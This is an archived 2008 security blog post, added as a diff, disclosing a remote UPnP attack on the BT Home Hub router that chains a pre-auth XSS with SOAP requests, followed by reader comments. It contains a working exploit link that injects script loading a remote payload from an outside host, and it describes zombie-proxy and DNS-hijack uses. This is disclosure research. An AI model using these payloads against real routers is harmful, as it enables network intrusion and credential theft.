@@ -1,0 +1,318 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-5/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:57:10 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (5) &#8211; exploiting IGDs remotely via UPnP</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (5) &#8211; exploiting IGDs remotely via UPnP Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Hacking with UPnP (Universal Plug and Play)' href='../hacking-with-upnp-universal-plug-and-play/index.html' />
+<link rel='next' title='Steal His Wi-Fi' href='../steal-his-wi-fi/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index071d.html?p=639' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-639" class="post">
+	<div class="post-title"><h2><span>BT Home Flub: Pwnin the BT Home Hub (5) &#8211; exploiting IGDs remotely via UPnP</span></h2></div>
+	<div class="post-date"><span>published:</span> January 10th, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>It&#8217;s known that <a href="http://www.upnp.org/resources/whitepapers.asp">UPnP</a> is inherently insecure for a very simple reason: administrative tasks can be performed on a Internet Gateway Device (IGD) without needing to know the admin password whatsoever! This on its own is quite scary and I personally feel that although there is some research in the public domain, there is much more attention that needs to be paid to UPnP.</p>
+
+<p>UPnP allows you to perform administrative functions. Some functions are very standardized and supported by most devices. Examples include obtaining network settings, and enabling port forwarding rules. Other functions are make/model specific. Some very scary functions such as obtaining administrative username and password pairs have been <a href="http://www.securityfocus.com/bid/7267/discuss">reported</a> in the past. As a reminder, this works without submitting any administrative password whatsoever since UPnP is a authenticationless protocol. On top of this, most IGDs support UPnP by default.</p>
+
+<p>After having read several UPnP security research materials I realized that all the described attacks assume that the attacker (be it human or malware) comes from inside the network. This post describes how to exploit IGDs remotely via UPnP <em>even when no services are publicly available</em> (WAN interface).</p>
+
+<h3>Preauth XSS + SOAP payload = remote UPnP exploitation</h3>
+
+<p>If you sniff yourself while running software that uses UPnP in the background to help you configure your router, you&#8217;ll see that UPnP is nothing more than SOAP. Our AJAX knowledge tells us about a feature that allows us to craft arbitrary XML requests: the <a href="http://www.w3.org/TR/XMLHttpRequest/">XMLHttpRequest</a> object. Trouble is, such object can only be used within the context of the site that the requests are submitted to. So if we host the malicious scripting code on a third-party site, and a victim user located in the same LAN as the target IGD visits such page, the request <em>wouldn&#8217;t</em> go through due to XMLHttpRequest same-origin policy restriction. Or put in a different way: you aren&#8217;t allowed to make <em>XMLHttpRequest</em>s to any server except the server where your web page came from.</p>
+
+<p>However, if you find a <a href="../bt-home-flub-pwnin-the-bt-home-hub-4/index.html">pre-auth XSS vulnerability</a> on the target device you can bypass such restriction. For instance, many devices such as the BT Home Hub and Speedtouch routers offer certain pages before authenticating. Some of these pages are cgi scripts which are vulnerable to XSS. Although offering certain &#8220;useless&#8221; functionalities before logging into the router might not seem like a big deal, it can actually lead to UPnP being exploited remotely, even if the web admin console is <em>not</em> visible from the Internet!</p>
+
+<p>The following is a non-malicious proof-of-concept exploit which sets up a port-forwarding rule from port 1337 on the WAN interface to port 445 on the internal IP address 192.168.1.64. Such IP address is the first usable IP address reserved for clients connected to Speedtouch and BT Home Hub routers. The exploit has been tested on BT Home Hub &#8211; Firmware version 6.2.6.B. Just to make things clear, UPnP is enabled by default on the BT Home Hub, just like most IGDs. If your Internet gateway is a BT Home Hub, clicking on the following link should add a new forward rule called <strong>EVILFORWARDRULE</strong>: <a href="http://192.168.1.254/cgi/b/ic/connect/?url=%22%3e%3cscript%20src='http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-5/payload.xss'%3e%3c/script%3e%3ca%20b=">ATTACK</a>.</p>
+
+<p>In order to check if the port-forwarding rule was added successfully you can use <a href="http://www.codeproject.com/KB/IP/PortForward.aspx">UPnP Port Forwarding Utility</a> and simply click on &#8220;Update list now&#8221; after the device has been discovered (device name should show on the top-left corner a few seconds later after launching the tool). You could of course use the technique and code explained in this post on any Internet gateway that supports UPnP and is a vulnerable to a preauth XSS vulnerability. If you manage to successfully test this attack on the BT Home Hub or any other device please let us know!</p>
+
+<pre><code><a href="../../static/blog/2008/01/payload.xss" rel="inline-text">http://www.gnucitizen.org/static/blog/2008/01/payload.xss</a></code></pre>
+
+<h3>Zombie routers and the unvalidated <em>NewInternalClient</em> bug</h3>
+
+<p>A bit of more UPnP hacking lead me to realize that the BT Home Hub is vulnerable to the (in)famous unvalidated <em>NewInternalClient</em> bug. This bug allows you to choose external IP addresses instead of a LAN IP addresses as intended when setting up port-forwarding rules via UPnP. In this case, I reused the previous code and  changed the internal IP address (<code>192.168.1.64</code>) in the <em>NewInternalClient</em> tag with the IP address of a random Internet web server and the value of the <em>NewInternalPort</em> tag to <code>80</code>. This effectively allows an attacker to use the vulnerable BT Home Hub router as a proxy &#8211; aka onion router. In other words, when probing the router&#8217;s NATed IP address on port 1337, the attacker is effectively probing the IP address and port number specified by the port-forwarding rule &#8211; except the routers IP address would be shown in logs of the target web server, as opposed to the attacker&#8217;s real IP address. I thought this is a nice real example of how a vulnerable router can be used as a <strong>zombie</strong> by simply having a user visit a page with malicious scripting (XSS + UPnP SOAP request). Imagine running your favourite vulnerability scanner against a target site, while using the victim user&#8217;s router as a proxy &#8211; sweet!</p>
+
+<p><em>There are other UPnP functionalities besides port forwarding rules that look potentially interesting from a hacking point of view. For instance, <a href="http://www-adele.imag.fr/users/Didier.Donsez/dev/osgi/upnpgendevice/api/fr/imag/adele/bundle/upnp/igd/model/LANHostConfigManagementModel.html#setDNSServer(java.lang.String)">SetDNSServer</a> allows you to guess what, set the gateway&#8217;s DNS server. Imagine someone changing your router&#8217;s DNS server setting by simply visiting a webpage. After that you visit yourfavoritebank.com and guess what, you&#8217;re actually visiting a malicious server that is harvesting all your banking login details! I&#8217;ll leave the exercise of writing a remote UPnP exploit that changes the DNS server setting on the BT Home Hub (or any other vulnerable router) to the reader.</em></p><div class="single-content-bottom-widgets"></div></div>
+	<ul class='post-meta'>
+<li><span class='post-meta-key'>Download:</span> <a href="../../static/blog/2008/01/payload.xss">payload.xss</a></li>
+<li><span class='post-meta-key'>Launch:</span> <a href="http://192.168.1.254/cgi/b/ic/connect/?url=%22%3e%3cscript%20src='http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-5/payload.xss'%3e%3c/script%3e%3ca%20b=">BT Home Hub PoC exploit</a></li>
+</ul>
+	<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-98226">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-98226">
+			January 10, 2008 at 11:28 pm</a>		</div>
+
+		<p>Something that worries me about many network devices that support UPnP is that when you change settings via UPnP they sometimes cannot be undone via the web console! Instead you need to undo them via UPnP.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-98540">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rezn</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-98540">
+			January 11, 2008 at 4:26 pm</a>		</div>
+
+		<p>UPNP requests executed via DNS Rebinding sounds like a really ugly thing.  One that wouldn&#8217;t be difficult to code up into a convenient little applet.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-98569">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/814aaca7f2ffb892b4694cca7fb6dc09?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://./' rel='external nofollow' class='url'>Mark</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-98569">
+			January 11, 2008 at 6:43 pm</a>		</div>
+
+		<p>Bt have kindly updated HH to version E, if you changed your password from the default (please!) the exploit now just goes into a loop with no changes made. AFAIK the HH now requires a serial number input in order to change the pass also.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp odd alt thread-odd thread-alt depth-1" id="comment-98570">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-98570">
+			January 11, 2008 at 6:45 pm</a>		</div>
+
+		<p>10x for the info. through, I am not sure whether it is me, but how is that related to the hack discussed above.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-98674">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-98674">
+			January 12, 2008 at 1:40 am</a>		</div>
+
+		<p>Hi Mark. I&#8217;m a bit confused about your comment. Changing passwords shouldn&#8217;t make a difference on this exploit as the payload uses a UPnP which is a authentication-less protocol (no password required!).</p>
+<p>Please elaborate so I can understand your problem better.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-100313">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5ed89ac7e2508fffb0ced695aee01a40?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">gool</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-100313">
+			January 16, 2008 at 8:19 pm</a>		</div>
+
+		<p>i found that u can get straight to menu in last firmware without serial chk but it will ask for user and password</p>
+<p><a href="http://192.168.1.254/cgi/b/connchk/?ce=1&amp;be=0&amp;l0=4&amp;l1=-1" rel="nofollow">http://192.168.1.254/cgi/b/con.....#038;l1=-1</a></p>
+<p>hope can find bug in laste firmware, UPnP attack dosent work on last firmware E</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp even thread-even depth-1" id="comment-100323">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-100323">
+			January 16, 2008 at 8:46 pm</a>		</div>
+
+		<p>gool, the UPnP attack does work on the latest firmware.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-101089">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c61f603bdffc3d341e75ef865f9486a1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">catweazle</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-101089">
+			January 19, 2008 at 12:48 am</a>		</div>
+
+		<p>gool: I run an Alcatel Speedtouch 510 (4.3.2.6.0 firmware; 9 volt supply version)router and set it to disable UPnP, turned firewall on to standard level and when I retrieve your link it opens the 510 Connectivity Check menu window.</p>
+<p>This is quite scary as I thought UPnP was blocked by the 510. What &#8216;should&#8217; your link do? (Using Mac OS Leopard)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-101091">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c61f603bdffc3d341e75ef865f9486a1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">catweazle</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-101091">
+			January 19, 2008 at 1:03 am</a>		</div>
+
+		<p>DUH! Am so confused reading all the above have answered my own question! Of course this will happen! Sorry.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123118">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a316c5df8a71f897ab4ec571e6760e52?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">anonymous</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123118">
+			July 29, 2008 at 2:00 am</a>		</div>
+
+		<p>Hi,</p>
+<p>This must sound really dumb to you guys but I have to ask it .. how are you allowed to make a request to 192.*.* if you are from some evil.com site?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-123130">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>Adrian 'pagvac' Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123130">
+			July 30, 2008 at 12:31 am</a>		</div>
+
+		<p>@anonymous: that question is NOT dumb at all! The only reason why it&#8217;s possible to contact an internal system (home router in this case) is because:</p>
+<p>1. you visit evil.com which loads HTML/JS code in your browser<br />
+2. your browser executes such code<br />
+3. since your browser is located in the *internal* network (LAN), it CAN communicate with your home router, even if the HTTP service is only available internally</p>
+<p>In other words: your browser becomes your worst enemy. It&#8217;s nothing else than a proxy which links both the external world (WAN/Internet) and the internal one (LAN/intranet).</p>
+<p>Makes sense? Let me know if you have any other questions.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-126525">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2865f744799904b77b24b6e2f52e0652?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ocean</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126525">
+			April 15, 2009 at 11:21 am</a>		</div>
+
+		<p>great post. hey anybody know how to exploit NAT in router. Port forwarding is also best way to exploit router</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="639"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="1b06d24fd2" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-5/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:57:13 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
